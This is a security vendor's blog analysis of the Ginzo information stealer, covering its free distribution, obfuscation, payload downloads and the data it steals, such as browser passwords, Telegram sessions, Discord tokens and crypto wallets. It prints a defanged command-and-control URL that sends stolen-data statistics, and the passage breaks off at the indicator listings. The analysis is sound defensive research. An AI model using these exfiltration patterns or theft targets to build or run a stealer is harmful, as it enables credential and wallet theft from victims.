report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
chapter_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: 04/21/2022 G DATA Blog

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
chapter_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: We identified more than 400 samples for Ginzo stealer within 10 days since 20th March and the numbers are rising. What is behind the free stealer?

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
chapter_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Reading time: 3 min (786 words)

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: We discovered and announced Ginzo stealer[1] on March 24, 2022. A Youtube video, discovered by @3xp0rtblog, showcases the first release. It was uploaded on 4th of March.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: The description below the video states that the stealer is provided for free, which is most likely a marketing technique to get criminal buyers hooked.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: If that is a marketing technique, it has worked well for the criminals. Just counting the samples we saw between 20th and 30th of March, we found more than 400 Ginzo stealer binaries on VirusTotal.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo's Telegram channel states that the stealer is for sale by now.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo stealer is obfuscated with ConfuserEx resulting in error messages when trying to decompile the code. That is because the type initializer .cctor decrypts the actual code on the fly. It also initializes data required for string decryption.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Automatic deobfuscation with tools like de4dot is not sufficient anymore. A combination of debugging (to obtain the decrypted code and strings), static analysis and manual deobfuscation is necessary to obtain readable code.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: .cctor decrypts the actual code

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo stealer first downloads the following additional libraries from its C&C server:

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Newtonsoft.Json.dll BouncyCastle.Crypto.dll SQLite.Interop.dll for x86 and x64 System.Data.SQLite.dll DotNetZip.dll

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Due to improper exception handling the stealer crashes some time later if these libraries cannot be downloaded.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: The stealer requests a ginzolist.txt from the C&C server. This text file contains addresses of additional download locations for executables. In our tests the file contained two entries that instruct Ginzo to download antiwm.exe[2] and generation.exe[3]. The file antivm.exe is a malicious coinminer and generation.exe is another .NET based stealer, specializing on Discord tokens. Both of these files are packed.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo creates a folder named GinzoFolder in %LOCALAPPDATA% (see picture below). It stores all the extracted system data there, like screenshots, credentials, cookies, telegram data, and cryptocurrency wallets. The stealer creates a file named System.txt to store generic system information, which includes the IP address, operating system, username, computername, screen resolution, graphics card, processor, RAM, launch time and the Ginzo stealer telegram channel. The stealer also stores a datetime value in ChromeUploadTime.txt for making sure that the stolen data is not sent too often to the threat actor.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: A listing of GinzoFolder contents and contained data is in the IoC section at the bottom.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Contents of GinzoFolder which saves all the extracted data from an infected system (click to enlarge)

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Content of System.txt which collects general system information (click to enlarge)

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo obtains the following data from the system:

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Telegram sessions Opera, Chrome, Opera GX, Firefox cookies and passwords all Desktop files Discord tokens cryptocurrency wallets general system data

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: The stealer then contacts the C&C and starts with sending statistics about the stolen data:

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: hxxps://nominally.ru/g1nzo.php?data=1148674342&countc=<cookie_count>&countp=<password_count>&country=<country>&ip=<ip_address>&countw=<cryptowallet_count>

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: The digits that are sent via the data parameter are likely some kind of ID for the stealer binary.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo saves the files from GinzoFolder into ginzoarchive.zip and sends the archive to the C&C server.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Main routine for data stealing (side note for detection engineers: This shows manually deobfuscated code, including the naming of the methods, and is not fit for detection creation) (click to enlarge)

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo sends stolen data to the server (side note for detection engineers: This shows manually deobfuscated code, including the naming of the methods, and is not fit for detection creation) (click to enlarge)

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Ginzo is a full fledged stealer that has become widely used in a relatively short amount of time. It is yet another stealer that we may have to deal with in the following years if the Ginzo threat actors stay in the game.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: When criminals provide something for free, it is most likely not charity. It may be used to improve reputation, to hook future buyers, and in this case also to get stolen data while letting others do the job of spreading the malware, since all the data is funneled to the server of the Ginzo threat actors.

report_title: Criminals provide Ginzo stealer for free, now it is gaining traction
text: Below are listings for IoCs and targeted cryptowallets

text: Ginzo stealer targets among others cryptocurrency data and obtains them from either Chrome extensions or folders on the user system:
